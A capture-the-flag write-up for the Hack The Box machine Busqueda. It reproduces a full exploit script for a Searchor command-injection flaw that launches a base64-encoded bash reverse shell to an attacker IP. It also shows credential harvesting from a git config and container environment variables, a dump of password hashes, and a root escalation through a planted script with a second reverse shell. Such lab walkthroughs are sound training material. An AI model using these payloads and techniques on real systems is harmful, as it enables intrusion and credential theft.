# HTB Busqueda

scope: 10.129.228.217

First we ran SYN scan on the target (first 1000 ports) with the -A flag on:

	nmap -sS -A 10.129.228.217 -oN scan.txt

```
# Nmap 7.95 scan initiated Thu Mar 27 12:08:05 2025 as: /usr/lib/nmap/nmap --privileged -sS -A -oN scan.txt 10.129.228.217
Nmap scan report for searcher.htb (10.129.228.217)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   83.74 ms 10.10.16.1
2   28.19 ms searcher.htb (10.129.228.217)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 27 12:08:16 2025 -- 1 IP address (1 host up) scanned in 11.06 seconds
```

The hostname `searcher.htb` was identified as being the box's hostname so an entry to `/etc/hosts` was created.

`sudo echo "10.129.228.217 searcher.htb" >> /etc/hosts`

Then we checked out the application being served in port 80.

![](./assets/searcher-flask-app.png)

The footer is particularly revealing

![](./assets/searcher-footer.png)

On Searchor's [github page](https://github.com/ArjunSharda/Searchor/security), we find a Vulnerability disclosure and a link to another github repo with a PoC.

![](./assets/searchor-security.png)

https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

![](./assets/searchor-vuln.png)

we download the PoC code and execute:

```
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example:

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
fi
```

The script crafts a reverse shell and makes sure it is safe to transmit via HTTP by encoding it to base64
Assuming the Flask app behind it doesn't sanitize its inputs we should be able to execute arbitrary Python code as the user running the webapp process.

So in one terminal we start up our netcat listener `nc -lvnp 1337`
and on another we run our exploit:
`./exploit.sh searcher.htb 10.10.16.32`

et voilà we get a reverse shell as the user `svc`

![](./assets/user.png)

looking around we immediately notice the `.git/config` file

![](./assets/git-config.png)

```
cat /var/www/app/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

which contains git credentials `cody:jh1usoih2bkjaspwe92`

we also see notice the `gitea.searcher.htb` subdomain

so we add it to our hosts file for a later visit

`sudo echo "10.129.228.217 gitea.searcher.htb" >> /etc/hosts`

python3 is installed on the box so we spawn a pseudo terminal to upgrade our reverse shell
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

as part of our privilege escalation heuristic we run `sudo -l` to check for superuser privileges, when asked for svc's password we try with cody's which we found earlier

```
svc@busqueda:/var/www/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
svc@busqueda:/var/www/app$ sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Seems like we can run `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *` as root but we cannot read the script's contents

```
svc@busqueda:/var/www/app$ ls -alh /opt/scripts/system-checkup.py
-rwx--x--x 1 root root 1.9K Dec 24  2022 /opt/scripts/system-checkup.py
```

From running the script as it is intended we get a bounty of information:
```
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 5 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 5 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
svc@busqueda:/var/www/app$
```

There are two containers running on this box, one is running a gitea instance and the other a mysql database

The `docker-inspect` subcommand seems to be a wrapper of `docker inspect` with which we can take a closer look at the running containers, specifically their configured environment variables:

```
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 5 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 5 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{ .Config.Env }}' 960873171e2e
[USER_UID=115 USER_GID=121 GITEA__database__DB_TYPE=mysql GITEA__database__HOST=db:3306 GITEA__database__NAME=gitea GITEA__database__USER=gitea GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea]

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{ .Config.Env }}' f84a6b33fb5a
[MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh MYSQL_DATABASE=gitea PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOSU_VERSION=1.14 MYSQL_MAJOR=8.0 MYSQL_VERSION=8.0.31-1.el8 MYSQL_SHELL_VERSION=8.0.31-1.el8]
```

From this we gather two username/password pairs for mysql:

```
root:jI86kGUuj87guWr3RyF
gitea:yuiu1hoiu4i5ho1uh
```

From the `docker-ps` output we know that the mysql container port 3306 is bound to the loopback interface so we use the installed mysql client to login as the root user.

`mysql -h 127.0.0.1 -u root -p`


```
svc@busqueda:/var/www/app$ mysql -h 127.0.0.1 -u root -p
Enter password: jI86kGUuj87guWr3RyF

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1817
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

Looking around at the tables on the gitea database we see one called `users` and run the following query:
`select id, name, passwd from user;`

```
mysql> select id, name, passwd from user;
+----+---------------+------------------------------------------------------------------------------------------------------+
| id | name          | passwd                                                                                               |
+----+---------------+------------------------------------------------------------------------------------------------------+
|  1 | administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
|  2 | cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+----+---------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

There are only two users on the database, time to pay `gitea.searcher.htb` a visit!

`cody`'s login reveals a repo containing the flask app we used to gain a foothold on the system and not much more.

Using `administrator:yuiu1hoiu4i5ho1uh` as login credentials we find a `scripts` repo that contains what seems to be the python tool we used earlier, the `full-checkup` subcommand on the `system-checkup.py` script looks particularly interesting:

```
[...]
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
[...]

```

As we know, python looks at the current directory when using relative paths so this would explain the output of the command `full-checkup` being `'Something went wrong'` as there is no file `full-checkup.sh` in `/var/www/app` (Flask app root directory).
So we create it with a command of our choice, for example:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.32/5656 0>&1
```

Running `nc -lvnp 5656` on our local machine plus `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` will have a reverse shell connect back to us and we have root!

![](./assets/privesc-exec.png)
![](./assets/root.png)

